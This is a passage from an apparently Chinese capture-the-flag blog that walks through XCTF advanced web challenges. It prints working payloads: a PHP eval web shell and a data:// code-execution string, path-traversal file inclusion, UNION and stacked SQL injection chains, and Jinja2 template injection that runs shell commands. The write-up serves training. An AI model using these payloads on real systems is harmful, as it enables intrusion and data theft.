<li><code>?page=data://text/plain,&lt;?php%20system(&#39;ls&#39;)?&gt;</code></li>
<li><code>?page=data://text/plain,&lt;?php%20@eval $_POST[&#39;sung&#39;];?&gt;</code>，antsword连接</li>
</ol>
<p>对于hello参数的用法更简单，直接<code>?hello=&lt;?php system(&#39;ls&#39;);?&gt;</code></p>
<p>看wp还有一种直接登录phpadmin然后在数据库写马，antsword连接。</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812194901568.png" alt="image-20210812194901568"></p>
<h3 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h3><p>暴力破解，burp抓包发到intuder模块，对id参数整数爆破，id=2333得到的响应长度不同，查看flag。</p>
<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>进去只有一张表情包，查看网页源代码，注释里写着<code>source.php</code>，用burp扫描目录。</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816084257141.png" alt="image-20210816084257141"></p>
<p>我们得到了源码，代码审计：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>]; <span class="comment">//数组：索引=&gt;字符串</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(                       <span class="comment">//截取一段字符串</span></span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)           <span class="comment">//返回?的位置</span></span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);                <span class="comment">//url解码</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;       <span class="comment">//截到source.php或者hint.php</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) )</span><br><span class="line">    &#123;                                               <span class="comment">//file字符串要通过checkfile验证</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以我们的目的就是让<code>file</code>参数传入一个文件绕过checkFile函数验证，构造<code>payload:?file=hint.php?</code>，通过第一个if判断return true。一些wp对<code>?</code>进行两次url编码是为了通过第二个if。</p>
<p>如何运用include去得到我们的flag？</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816112901649.png" alt="image-20210816112901649"></p>
<p>include的寻找顺序：</p>
<ol>
<li>先按参数给出的路径寻找，给出绝对路径（<code>/</code>开头）或者相对路径（<code>./</code>或者<code>../</code>）</li>
<li>没有给出路径则按照<code>include_path</code>规定的目录寻找</li>
<li>再找不到就在文件所在目录或者当前目录下寻找。</li>
</ol>
<p>所以payload:<code>?file=hint.php?/../../../../ffffllllaaaagggg</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816142146352.png" alt="image-20210816142146352"></p>
<h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>没有任何过滤的sql注入。</p>
<p>判断其字段数：<code>&#39; and 1=0 union select 1,2,3#</code>。成功回显</p>
<p>判断当前数据库名以及版本：<code>&#39; and 1=0 union select 1,database(),version()#</code>。</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816080824462.png" alt="image-20210816080824462"></p>
<p>获得所有的数据库名：<code>111&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata#</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816081723926.png" alt="image-20210816081723926"></p>
<p>查询<code>news</code>数据库中的表信息：<code>111&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816082336320.png" alt="image-20210816082336320"></p>
<p>查看<code>secret_table</code>表中的列信息：<code>111&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;secret_table&quot;#</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816082311624.png" alt="image-20210816082311624"></p>
<p>查看<code>fl4g</code>中的信息：<code>111&#39; union select 1,2,group_concat(fl4g) from news.secret_table#</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816082430767.png" alt="image-20210816082430767"></p>
<p><code>flag: QCTF&#123;sq1_inJec7ion_ezzz&#125;</code></p>
<h3 id="NaNa"><a href="#NaNa" class="headerlink" title="NaNa"></a>NaNa</h3><p>附件下载后的内容如下：</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211206181425358.png" alt="image-20211206181425358"></p>
<p>上面有很多红点没法显示，是因为编码的问题，不过每个字符都是不一样的。</p>
<p>代码执行过程：</p>
<ol>
<li><p><code>_</code>变量赋值一个字符串</p>
</li>
<li><p><code>for</code>循环，<code>Y</code>变量取一个奇怪的字符</p>
</li>
<li><p>循环内部，<code>with</code>语句相当于<code>_=_.split($[Y]).join(_.split($[Y]).pop())</code></p>
</li>
<li><p>最后<code>eval</code>函数执行处理之后的字符串。</p>
</li>
</ol>
<p>因为javascript没有输出语句，我们将eval直接改成<code>alert(_)</code>或者<code>document.write(_)</code>等</p>
<p>得到代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">&quot;c&quot;</span>).value;</span><br><span class="line">    <span class="keyword">if</span>(e.length==<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                    <span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">var</span> t=[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> n=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_h0l&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> r=[<span class="string">&quot;g&#123;&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;_0&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> i=[<span class="string">&quot;it&#x27;&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">                            s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure>

<p>如果满足<code>if</code>这些条件，那就计算得到<code>flag</code>，直接将<code>if</code>语句的计算式粘贴到控制台，结果如下：<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210901225754630.png" alt="image-20210901225754630"></p>
<h3 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h3><p>进去之后啥也没看到，hint: Can you anthenticate to this website?，验证身份，用burp添加目录字典扫描，发现了<code>index.phps</code>非常奇怪的一个文件，我们访问得到了源代码。</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815182807625.png" alt="image-20210815182807625"></p>
<p>源码如下</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815183226544.png" alt="image-20210815183226544"></p>
<p>所以就是id参数要等于url编码的admin，所以payload等于<code>index.php?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</code>。注意浏览器本身会对url进行解码，所以我们要进行两次编码。</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815183551331.png" alt="image-20210815183551331"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815183847894.png" alt="image-20210815183847894"></p>
<h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><p>之前已经了解过反序列化的相关知识了，相比较HNU的反序列化，这道很简单了。</p>
<p>我们需要绕过的是<code>_wakeup()</code>函数，只需要将成员数从1改成2就行了</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816150334273.png" alt="image-20210816150334273"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816150727147.png" alt="image-20210816150727147"></p>
<h3 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h3><p>上传文件漏洞，选择一个php文件发现连上传都上传不了，前端限制了上传方式，其实可以直接删除disabled属性提交。</p>
<p>但是为了学习，我们查看源。</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816162642338.png" alt="image-20210816162642338"></p>
<p>就是使用check()函数去检查是否可以上传，<code>name.replace(/^.+\./, &#39;&#39;)</code>表示将<code>.</code>之前的文件名替换为空</p>
<p><code>arr[].contaings(ext)</code>如果检查到数组包含ext元素，则返回true。</p>
<p>所以方法有：</p>
<ol>
<li>F12删除disabled，即可直接上传php文件<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816190351845.png" alt="image-20210816190351845"></li>
<li>先上传jpg文件，burp抓包然后修改文件后缀名。</li>
</ol>
<p>最后都是蚁剑连接，查看flag<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816190453332.png" alt="image-20210816190453332"></p>
<h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><p>模板注入题，学不会啊。</p>
<p>参考：<a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a>，这道题是模板junjia2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__class__ ： 返回对象所属的类</span><br><span class="line">__mro__ ： 返回一个类所继承的基类元组,，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__ ： 返回该类所继承的基类，只能是上一个基类</span><br><span class="line">__subclasses__ ： 每个新类都保留了子类的引用，这个方法返回一个 类中仍然可用的的引用的列表</span><br><span class="line">__init__ ： 类的初始化方法</span><br><span class="line">__globals__ ： 对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>

<p> <code>os.system</code> 和 <code>os.popen</code>, 这两句前者返回<strong>退出状态码</strong> , 后者<strong>以file形式</strong>返回<strong>输出内容</strong>, 我们想要的是内容，所所以选择 <code>os.popen</code> </p>
<p>列出步骤：</p>
<ol>
<li><code>&#123;&#123;config&#125;&#125;</code>，检测是否有模板注入，返回config信息</li>
<li><code>&#123;&#123;''.__class__&#125;&#125;</code>，返回所属类</li>
<li><code>&#123;&#123;''.__class__.__mro__&#125;&#125;</code>，返回所属类的基类</li>
<li><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()&#125;&#125;</code>，返回基类object类的子类</li>
<li><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code><br>找到排在第72个的site_Printer类，初始化然后<code>os.popen</code>执行命令，读取。</li>
<li><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]("fl4g").read()&#125;&#125;</code><br><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()&#125;&#125;</code><br>使用文件名.read()的方式读取文件</li>
</ol>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210817112826768.png" alt="image-20210817112826768"></p>
<p>总结：本题是对url先传入再渲染，所以在渲染的时候对<code>&#123;&#123;&#125;&#125;`内容当作变量解析，所以出现了漏洞。



### Web_php_unserialize

php反序列化漏洞。

根据提示我们要得到`fl4g.php`，我们需要绕过的只有两个点：

1. 绕过`_wakeup()`，通过让序列化后的属性数超过本该的属性数，导致异常，不执行wakeup函数。
2. 绕过`preg_match('/[oc]:\d+:/i', $var)`，正则匹配，`[oc]`元字符匹配一个字符o或者c，`:`普通字符:，`\d`元字符匹配一个数字，`+`元字符表示可以匹配一个或多个前一个字符`\d`，`:`普通字符。

![image-20210817150314888](攻防世界web进阶区/image-20210817150314888.png)

得到flag

![image-20210817153913773](攻防世界web进阶区/image-20210817153913773.png)

### supersqli

强网杯的题，sql注入。

首先，`1' or 1=1 #`有返回结果，是个注入点。

![image-20210817162444026](攻防世界web进阶区/image-20210817162444026.png)

然后union select联合查询，发现失败了。

![image-20210817162523541](攻防世界web进阶区/image-20210817162523541.png)

这道题考查的是堆叠注入，查询还可以使用show

1. 查询所有的数据库：`1';show database;#`
2. 查所有的表：`1';show tables;`
3. 查表中的所有字段：``1';show columns from `1919810931114514`;``
4. 查看flag字段：``1';Set @sql = CONCAT('se','lect flag from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#``，过滤set但是可以大小写绕过strstr函数

![image-20210817190245570](攻防世界web进阶区/image-20210817190245570.png)

这道题的方法属实有点多，一下子见识到了sql注入的各种手段和知识点：

1. handler代替select，handler拥有select的部分功能
2. 预编译，也就是我使用的，set、prepare、execute。
3. 更改表名列名，将现在所查询的表与想要查询的表，用rename和alter语句将表名和字段名互换，然后直接查询`1' or 1=1`即可得到flag。
4. show的用法



### easytornado

模板注入题，使用的是python的tornado模板

有三个文件，还有一个跳转到的error文件

![image-20210818092711193](攻防世界web进阶区/image-20210818092711193.png)

![image-20210818092929405](攻防世界web进阶区/image-20210818092929405.png)

![image-20210818093021681](攻防世界web进阶区/image-20210818093021681.png)

![image-20210818093032490](攻防世界web进阶区/image-20210818093032490.png)

![image-20210818102517809](攻防世界web进阶区/image-20210818102517809.png)

给了四个信息：

1. flag在/fllllllllllllag文件
2. reder渲染，render是一个类似模板的东西，可以使用不同的参数来访问网页
3. hint提示，md5加密还有cookie_secret加盐，与url对比，发现这个md5值就是filehash的值。
4. error的msg就是我们模板注入的地方

修改msg参数进行注入。在tornado模板引擎中，存在一些可以访问的快速对象，`&#123;&#123;handler.settings&#125;&#125;</code>对象获得环境变量</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210818115153046.png" alt="image-20210818115153046"></p>
<p>然后<code>md5(cookie_secret+md5(filename))</code>，filename=/fllllllllllllag，得到filehash<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210818115546418.png" alt="image-20210818115546418"></p>
<p>得到flag：</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210818115605489.png" alt="image-20210818115605489"></p>
<h3 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h3><p>进入页面有python代码，先进行代码审计</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>flask框架，是一个服务器端模板注入</p>
<p><code>/shrine/&lt;path:shrine&gt;</code>可以被<code>flask.render_template_string</code>渲染，同时我们看到对小括号进行了替换，将 ( 和 ) 替换为空字符串，config和self是黑名单。</p>
<p>所以<code>__subclasses__()</code>、<code>&#123;&#123;config&#125;&#125;</code>、<code>&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125;</code>不能用，但是还有别的函数可以用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>





<h3 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h3><p>进入环境，根据提示进入云平台设备维护中心，也可以用burp扫描目录发现。</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210829144657357.png" alt="image-20210829144657357"></p>
<p>发现get型参数page=index，并且回显在页面，应该是本地文件包含(LFI)。</p>
<p>使用hackbar自带的测试语句</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210829153518678.png" alt="image-20210829153518678"></p>
<p>成功显示说明存在本地文件包含漏洞，然后尝试hackbar的php伪协议</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210829165018121.png" alt="image-20210829165018121"></p>
<p>base64解码得到index.php源码，进行审计</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">@session_start();</span><br><span class="line">posix_setuid(1000);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;renderer&quot; content=&quot;webkit&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/layui.css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">    &lt;title&gt;设备维护中心&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;ul class=&quot;layui-nav&quot;&gt;</span><br><span class="line">        &lt;li class=&quot;layui-nav-item layui-this&quot;&gt;&lt;a href=&quot;?page=index&quot;&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;fieldset class=&quot;layui-elem-field layui-field-title&quot; style=&quot;margin-top: 30px;&quot;&gt;</span><br><span class="line">        &lt;legend&gt;设备列表&lt;/legend&gt;</span><br><span class="line">    &lt;/fieldset&gt;</span><br><span class="line">    &lt;table class=&quot;layui-hide&quot; id=&quot;test&quot;&gt;&lt;/table&gt;</span><br><span class="line">    &lt;script type=&quot;text/html&quot; id=&quot;switchTpl&quot;&gt;</span><br><span class="line">        &lt;!-- 这里的 checked 的状态只是演示 --&gt;</span><br><span class="line">        &lt;input type=&quot;checkbox&quot; name=&quot;sex&quot; value=&quot;&#123;&#123;d.id&#125;&#125;&quot; lay-skin=&quot;switch&quot; lay-text=&quot;开|关&quot; lay-filter=&quot;checkDemo&quot; &#123;&#123; d.id==1 0003 ? &#x27;checked&#x27; : &#x27;&#x27; &#125;&#125;&gt;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;layui/layui.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.use(&#x27;table&#x27;, function() &#123;</span><br><span class="line">        var table = layui.table,</span><br><span class="line">            form = layui.form;</span><br><span class="line"></span><br><span class="line">        table.render(&#123;</span><br><span class="line">            elem: &#x27;#test&#x27;,</span><br><span class="line">            url: &#x27;/somrthing.json&#x27;,</span><br><span class="line">            cellMinWidth: 80,</span><br><span class="line">            cols: [</span><br><span class="line">                [</span><br><span class="line">                    &#123; type: &#x27;numbers&#x27; &#125;,</span><br><span class="line">                     &#123; type: &#x27;checkbox&#x27; &#125;,</span><br><span class="line">                     &#123; field: &#x27;id&#x27;, title: &#x27;ID&#x27;, width: 100, unresize: true, sort: true &#125;,</span><br><span class="line">                     &#123; field: &#x27;name&#x27;, title: &#x27;设备名&#x27;, templet: &#x27;#nameTpl&#x27; &#125;,</span><br><span class="line">                     &#123; field: &#x27;area&#x27;, title: &#x27;区域&#x27; &#125;,</span><br><span class="line">                     &#123; field: &#x27;status&#x27;, title: &#x27;维护状态&#x27;, minWidth: 120, sort: true &#125;,</span><br><span class="line">                     &#123; field: &#x27;check&#x27;, title: &#x27;设备开关&#x27;, width: 85, templet: &#x27;#switchTpl&#x27;, unresize: true &#125;</span><br><span class="line">                ]</span><br><span class="line">            ],</span><br><span class="line">            page: true</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.use(&#x27;element&#x27;, function() &#123;</span><br><span class="line">        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块</span><br><span class="line">        //监听导航点击</span><br><span class="line">        element.on(&#x27;nav(demo)&#x27;, function(elem) &#123;</span><br><span class="line">            //console.log(elem)</span><br><span class="line">            layer.msg(elem.text());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$page = $_GET[page];</span><br><span class="line"></span><br><span class="line">if (isset($page)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (ctype_alnum($page)) &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=&quot;text-align:center&quot;&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;&lt;?php 